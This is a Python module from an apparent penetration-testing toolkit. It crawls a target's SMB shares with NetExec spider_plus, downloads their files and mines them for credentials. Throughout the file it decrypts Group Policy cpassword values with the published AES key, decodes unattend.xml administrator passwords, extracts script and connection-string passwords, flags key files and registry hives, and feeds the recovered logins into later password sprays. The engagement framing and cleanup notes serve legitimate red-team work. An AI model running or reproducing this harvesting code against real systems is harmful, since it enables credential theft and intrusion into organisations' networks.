"""SMB share spidering + secret scrubbing → loot → creds.

Drives ``nxc smb -M spider_plus`` (metadata JSON + downloads under a 50KB cap), walks
the downloaded corpus with an inspectable ruleset of high-signal scrubbers, folds every
hit into ``loot``, and promotes anything usable (a plaintext ``user:pass``, a
GPP ``cpassword``, an unattend ``AdministratorPassword``) straight to a
:class:`~fieldkit.creds.Credential` — so the credential loop picks it up on the next
spray without a hand-copy.

Design rules:

* **Rule 1** — the driver here is one function; the CLI just calls it. The scrubbers are
  pure ``bytes -> [Hit]`` functions so the same table renders in `arsenal rules`.
* **Rule 2** — nxc is invoked through the injected runner; tests fake it.
* **Rule 3** — every scrub hit becomes a :class:`~fieldkit.state.Store` ``step`` with the
  file path and a redacted snippet, so a promoted credential can be traced back to the
  file it came from.
* **Rule 7** — a promoted secret goes through :class:`~fieldkit.creds.Credential`, never
  a hand-built string.

Client-data safeguard: the downloaded corpus is a copy of the client's files. The
driver records a **deletion obligation** in the cleanup manifest naming the local
folder — the report says so, and ``report --cleanup`` will remove it.
"""
import base64
import json
import os
import re
from dataclasses import dataclass, field

from . import creds as creds_mod
from . import runner as runner_mod
from .creds import Credential, CredentialError


# ---------------------------------------------------------------- inventory

@dataclass(frozen=True)
class Hit:
    """One scrub hit inside one file. ``snippet`` is redacted enough to be safe in a
    step record; ``credential`` is set when the hit is promotable to a login."""

    kind: str                       # "gpp-cpassword" / "unattend" / "kv-secret" / ...
    file: str                       # local path on the attacker box
    share_path: str                 # "SHARE\\path\\file.ext" as the target sees it
    snippet: str                    # redacted evidence, ≤200 chars
    credential: Credential = None   # set when promotable


@dataclass
class SpiderReport:
    """Counters for one loot pass."""

    shares_readable: int = 0
    files_inventoried: int = 0
    files_scrubbed: int = 0
    hits: list = field(default_factory=list)      # every Hit, ordered
    creds_promoted: int = 0
    error: str = None                              # nxc did not run at all


# ---------------------------------------------------------------- helpers


def _redact(text, keep=4):
    """Redact a secret for a step snippet: ``Winter2025!`` -> ``Wint***``."""
    text = str(text).strip()
    return text[:keep] + "***" if len(text) > keep + 3 else "***"


def _clip(text, n=200):
    text = text.replace("\n", " ").replace("\r", "").strip()
    return text if len(text) <= n else text[:n] + "…"


def _read_text(path, limit=200_000):
    """Read a file as text, best-effort. Returns "" on any error (unreadable, binary,
    encoding mismatch) — the scrub set is a *sweep*, not a guarantee."""
    try:
        with open(path, "rb") as fh:
            raw = fh.read(limit)
    except OSError:
        return ""
    for enc in ("utf-8-sig", "utf-16-le", "utf-16-be", "cp1252", "latin-1"):
        try:
            return raw.decode(enc)
        except UnicodeDecodeError:
            continue
    return ""


# ---------------------------------------------------------------- scrubbers
# Each scrubber is ``(local_path, share_path, text) -> [Hit]``. Pure — no I/O beyond
# the passed-in text. Add a scrubber to :data:`SCRUBBERS`; every one shows up in
# `fieldkit arsenal rules`.


#: The Microsoft-published AES key used to encrypt GPP cpassword values, from the
#: MSDN "Group Policy Preferences Password" article — the key was intentionally shipped
#: in public documentation, which is what MS14-025 acknowledged as the root cause. This
#: constant is what makes the sweep a proven-recovery, not a heuristic.
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057090240341b8a1406cba")

_GPP_CPASSWORD = re.compile(r'cpassword="([^"]+)"')
_GPP_USER = re.compile(r'(?:userName|newName)="([^"]+)"', re.I)


def _gpp_decrypt(cpassword, *, run=None):
    """Decrypt a Groups.xml cpassword (base64 → AES-256-CBC, zero IV, PKCS#7).

    Drives the operator's ``openssl`` through the injected runner (rule 2). Returns
    the plaintext, or None on any error — a decrypt miss is common enough (truncated
    cpassword on the wire, wrong padding) to be non-fatal, and the raw base64 is still
    recorded as loot for offline analysis.
    """
    run = run or (lambda argv, **kw: runner_mod.run(argv, timeout=10, **kw))
    padded = cpassword + "=" * (-len(cpassword) % 4)
    try:
        blob = base64.b64decode(padded)
    except ValueError:
        return None
    res = run(["openssl", "aes-256-cbc", "-d", "-K", _GPP_KEY.hex(),
               "-iv", "0" * 32, "-nopad"], input_bytes=blob)
    if getattr(res, "error", None):
        return None
    if getattr(res, "exit_code", 0) not in (0, None):
        return None
    plain = getattr(res, "stdout_bytes", None) or (res.stdout or "").encode("latin-1")
    if plain and plain[-1] <= 16:
        plain = plain[: -plain[-1]]
    try:
        return plain.decode("utf-16-le").rstrip("\x00")
    except UnicodeDecodeError:
        return None


def scrub_gpp(local, share_path, text):
    """Groups.xml / Services.xml / ScheduledTasks.xml with a cpassword — the SYSVOL classic.

    A cpassword decrypts to a plaintext with the Microsoft-published key (MS14-025),
    so every hit is a promotable credential when a partnered userName is present.
    """
    if "cpassword=" not in text:
        return []
    hits = []
    for m in _GPP_CPASSWORD.finditer(text):
        cpw = m.group(1)
        secret = _gpp_decrypt(cpw)
        user_m = _GPP_USER.search(text)
        user = user_m.group(1) if user_m else None
        cred = None
        if user and secret:
            try:
                domain, name = user.rsplit("\\", 1) if "\\" in user else ("", user)
                cred = Credential(username=name, secret=secret, domain=domain)
            except CredentialError:
                pass
        hits.append(Hit(kind="gpp-cpassword", file=local, share_path=share_path,
                        snippet=f"userName={user or '?'} cpassword={_redact(cpw)}",
                        credential=cred))
    return hits


_UNATTEND_PW = re.compile(
    r"<(?:AdministratorPassword|Password)>\s*<Value>([^<]+)</Value>", re.I)
_UNATTEND_USER = re.compile(
    r"<(?:Username|UserName|AccountName)>([^<]+)</", re.I)
_UNATTEND_PLAINTEXT = re.compile(r"<PlainText>\s*(true|false)\s*</PlainText>", re.I)


def scrub_unattend(local, share_path, text):
    """unattend.xml / sysprep.inf / autounattend.xml — Windows deployment answer files.

    An ``<AdministratorPassword>`` is base64 with a fixed salt when ``PlainText=false``,
    or literal when ``true`` — both promote to a real login.
    """
    if "<AdministratorPassword>" not in text and "<Password>" not in text:
        return []
    hits = []
    users = _UNATTEND_USER.findall(text)
    plaintext_flag = _UNATTEND_PLAINTEXT.search(text)
    is_plain = (plaintext_flag and plaintext_flag.group(1).lower() == "true")
    for m in _UNATTEND_PW.finditer(text):
        raw = m.group(1).strip()
        secret = raw
        if not is_plain:
            # trailing "AdministratorPassword" / "Password" salt is appended before b64.
            try:
                decoded = base64.b64decode(raw).decode("utf-16-le", errors="replace")
                for suffix in ("AdministratorPassword", "Password"):
                    if decoded.endswith(suffix):
                        decoded = decoded[: -len(suffix)]
                        break
                secret = decoded
            except (ValueError, UnicodeDecodeError):
                pass
        user = users[0] if users else "Administrator"
        try:
            cred = Credential(username=user, secret=secret, local_auth=True)
        except CredentialError:
            cred = None
        hits.append(Hit(kind="unattend", file=local, share_path=share_path,
                        snippet=f"user={user} pw={_redact(secret)} "
                                f"({'plain' if is_plain else 'base64+salt'})",
                        credential=cred))
    return hits


_WEBCONFIG_CS = re.compile(
    r'connectionString\s*=\s*"([^"]*(?:password|pwd)\s*=\s*[^;\"]+[^"]*)"', re.I)


def scrub_webconfig(local, share_path, text):
    """web.config / app.config — connection strings with an inline password.

    Loot-only: the DB creds are recorded (they often re-auth elsewhere), but promoting
    a *domain* login from a SQL connection string would be a bad inference.
    """
    if "connectionstring" not in text.lower():
        return []
    hits = []
    for m in _WEBCONFIG_CS.finditer(text):
        cs = m.group(1)
        pm = re.search(r"(?:password|pwd)\s*=\s*([^;\"]+)", cs, re.I)
        um = re.search(r"(?:user\s*id|uid)\s*=\s*([^;\"]+)", cs, re.I)
        pw = (pm.group(1) if pm else "").strip()
        user = (um.group(1) if um else "").strip()
        # redact the password inside the raw CS before it goes into the step
        cs_redacted = re.sub(r"((?:password|pwd)\s*=\s*)[^;\"]+", r"\1***", cs, flags=re.I)
        hits.append(Hit(kind="webconfig-cs", file=local, share_path=share_path,
                        snippet=f"user={user or '?'} pw={_redact(pw)} "
                                f"({_clip(cs_redacted, 80)})"))
    return hits


#: Sensitive filenames worth surfacing even when the content is opaque (encrypted KeePass
#: DBs, SSH keys, browser cred stores). No promotion — it's a pointer for the operator.
_INTERESTING = (
    (re.compile(r"\.kdbx?$", re.I), "keepass-db"),
    (re.compile(r"(^|/)id_(rsa|ed25519|ecdsa|dsa)(\.pub)?$", re.I), "ssh-key"),
    (re.compile(r"\.pem$|\.ppk$", re.I), "private-key"),
    (re.compile(r"\.pfx$|\.p12$", re.I), "cert-with-key"),
    (re.compile(r"\.git-credentials$|\.netrc$", re.I), "vcs-creds"),
    (re.compile(r"\.env(\.\w+)?$", re.I), "dotenv"),
    (re.compile(r"AWSCredentials|\.aws/credentials", re.I), "aws-creds"),
    (re.compile(r"Filezilla\.xml$|recentservers\.xml$|sitemanager\.xml$", re.I),
     "filezilla"),
    (re.compile(r"NTUSER\.DAT$|SYSTEM$|SECURITY$|SAM$", re.I), "reg-hive"),
    (re.compile(r"putty.*sessions", re.I), "putty-sessions"),
)


def scrub_filename(local, share_path, _text):
    """Filename-only sensitive-artifact tag. No content parse — the file *being there*
    is the finding (a .kdbx is a KeePass DB; grab it, crack offline)."""
    hits = []
    for pattern, kind in _INTERESTING:
        if pattern.search(share_path) or pattern.search(local):
            hits.append(Hit(kind=kind, file=local, share_path=share_path,
                            snippet=os.path.basename(share_path)))
            break
    return hits


#: Key=value forms that carry a secret in text/script/config files: `password: xyz`,
#: `-Password 'xyz'` (PowerShell), `$password='xyz'` (PowerShell var), `PASSWORD=xyz`.
#: High-signal for `.ps1` / `.bat` / `.ini` / `.env` — a scripted login checked into a
#: share. The token before ``password`` may be a sigil (``$``, ``-``, none).
_KV_PATTERNS = (
    re.compile(r"[\s;#$-]?(password|pwd|passwd|api[_-]?key|secret|token)\s*"
               r"[:=]\s*['\"]([^'\"]{4,80})['\"]", re.I | re.M),
    re.compile(r"(?:^|\s)-(password|pwd|passwd)\s+['\"]([^'\"]{4,80})['\"]",
               re.I | re.M),
)
#: Matches DB_USER=/user:/-User/-Username/$user= — any leading tokens ending in USER.
_KV_USER = re.compile(r"(?:^|[\s;#$])-?[\w]*(?:user(?:name)?)\s*"
                      r"[:=\s]\s*['\"]?([\w\.\\-]{2,64})['\"]?", re.I | re.M)


def scrub_kv(local, share_path, text):
    """Scripts/configs with a literal ``password: 'xyz'`` (or `-Password 'xyz'`)."""
    if len(text) < 8:
        return []
    lowered = share_path.lower()
    if not lowered.endswith((".ps1", ".psm1", ".psd1", ".bat", ".cmd", ".vbs",
                             ".ini", ".conf", ".config", ".env", ".yaml", ".yml",
                             ".json", ".txt", ".sql")):
        return []
    hits = []
    user_m = _KV_USER.search(text)
    user = user_m.group(1) if user_m else None
    for pat in _KV_PATTERNS:
        for m in pat.finditer(text):
            key, secret = m.group(1), m.group(2)
            cred = None
            if user and secret and "password" in key.lower():
                try:
                    domain, name = (user.rsplit("\\", 1) if "\\" in user
                                    else ("", user))
                    cred = Credential(username=name, secret=secret, domain=domain)
                except CredentialError:
                    pass
            hits.append(Hit(kind="kv-secret", file=local, share_path=share_path,
                            snippet=f"{key}={_redact(secret)}"
                                    + (f"  user={user}" if user else ""),
                            credential=cred))
    return hits


#: In loop order — the specific rules first, so a ``Groups.xml`` isn't classified as a
#: generic ``kv-secret`` when it's really a GPP cpassword.
SCRUBBERS = (scrub_gpp, scrub_unattend, scrub_webconfig, scrub_filename, scrub_kv)


# ---------------------------------------------------------------- driver


def _walk(root):
    """Every regular file under ``root``, breadth-first, deterministic order."""
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames.sort()
        for name in sorted(filenames):
            yield os.path.join(dirpath, name)


def _share_path(root, path):
    """``/tmp/xyz/host/SHARE/sub/file`` -> ``SHARE\\sub\\file`` (as the target sees it)."""
    rel = os.path.relpath(path, root).replace(os.sep, "\\")
    # The host dir spider_plus writes under is redundant for reporting; strip it.
    parts = rel.split("\\", 2)
    return parts[-1] if len(parts) > 1 else rel


def scrub_corpus(root):
    """Walk a downloaded spider_plus corpus and yield every :class:`Hit`. Pure — the
    caller writes them to the store."""
    for path in _walk(root):
        share_path = _share_path(root, path)
        # filename scrubbers get an empty body cheaply; content scrubbers get the file.
        text = None
        for scrub in SCRUBBERS:
            if scrub is scrub_filename:
                yield from scrub(path, share_path, "")
                continue
            if text is None:
                text = _read_text(path)
                if not text:
                    break
            yield from scrub(path, share_path, text)


# ---- runner-driven nxc pass -------------------------------------------------


def _nxc_argv(host, cred, output_folder):
    """Build the argv for ``nxc smb <host> -M spider_plus`` with our download folder.

    Delegates to :func:`fieldkit.creds.render_nxc` for the auth flags (rule 7: never
    build a shell string; canonical renderer only)."""
    rendered = creds_mod.render_nxc(cred, proto="smb", target=host)
    argv = list(rendered.argv) + [
        "-M", "spider_plus", "-o", "DOWNLOAD_FLAG=True",
        f"OUTPUT_FOLDER={output_folder}"]
    return argv, rendered.env


def _parse_inventory(output_folder, host_ip):
    """spider_plus writes ``{OUTPUT_FOLDER}/{host}.json`` — ``{share: {path: {size, ...}}}``."""
    path = os.path.join(output_folder, f"{host_ip}.json")
    if not os.path.exists(path):
        return {}, 0, 0
    try:
        data = json.loads(open(path, encoding="utf-8").read())
    except (OSError, ValueError):
        return {}, 0, 0
    files = sum(len(v) for v in data.values() if isinstance(v, dict))
    return data, len(data), files


def spider_and_scrub(store, host, cred, *, run=None, output_folder,
                     on_event=None, allow_promotion=True):
    """Drive ``nxc -M spider_plus`` against ``host``, scrub the downloaded corpus,
    and fold every hit into the store.

    Returns a :class:`SpiderReport`. The nxc runner is injected (``run=``) — no real
    child process runs when a test supplies a fake.
    """
    emit = on_event or (lambda _m: None)
    rep = SpiderReport()
    run = run or (lambda argv, **kw: runner_mod.run(argv, timeout=1800, **kw))
    # accept a sqlite Row (from Store) or a Credential (from a caller that already has one)
    if not isinstance(cred, Credential):
        cred = Credential.from_row(cred)

    argv, env = _nxc_argv(host["ip"], cred, output_folder)
    res = run(argv, env_add=env or None)
    if getattr(res, "error", None):
        rep.error = res.error
        return rep

    inv, rep.shares_readable, rep.files_inventoried = _parse_inventory(
        output_folder, host["ip"])
    emit(f"  spider {host['ip']}: {rep.shares_readable} share(s), "
         f"{rep.files_inventoried} file(s) inventoried")

    with store.transaction():
        # a deletion obligation for the downloaded client-data corpus (cleanup manifest).
        store.add_artifact(f"downloaded share corpus for {host['ip']}",
                           cleanup_cmd=f"rm -rf {output_folder}",
                           host_id=host["id"])

        for hit in scrub_corpus(output_folder):
            rep.files_scrubbed += 1
            rep.hits.append(hit)
            store.add_step(
                cmd=f"scrub:{hit.kind}", output=f"{hit.share_path} — {hit.snippet}",
                exit_code=0, host_id=host["id"],
                label=f"sharespider:{hit.kind}")
            store.add_loot(host["id"], f"sharespider:{hit.kind}",
                           value=hit.share_path, path=hit.file)
            if allow_promotion and hit.credential:
                _, created = store.add_credential(hit.credential,
                                                  source=f"sharespider:{hit.kind}")
                rep.creds_promoted += 1 if created else 0
        if rep.creds_promoted:
            emit(f"  spider {host['ip']}: +{rep.creds_promoted} credential(s) promoted")
    return rep
